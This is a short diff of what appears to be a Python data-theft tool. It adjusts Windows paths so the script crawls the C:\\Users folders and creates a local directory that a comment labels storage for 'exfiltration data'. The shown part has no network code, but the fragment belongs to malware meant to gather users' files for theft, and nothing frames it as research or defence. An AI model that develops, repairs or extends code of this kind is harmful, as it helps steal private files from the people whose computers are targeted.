@@ -50,8 +50,8 @@ def main():
 
     # If the OS is Windows #
     if os.name == 'nt':
-        path = 'C:\\Tmp'
-        crawl_path = 'C:\\Users\\'
+        path = 'C:\\Tmp\\'
+        crawl_path = 'C:\\Users'
 
         # Ensure storage path for exfiltration data exists #
         pathlib.Path(path).mkdir(parents=True, exist_ok=True)
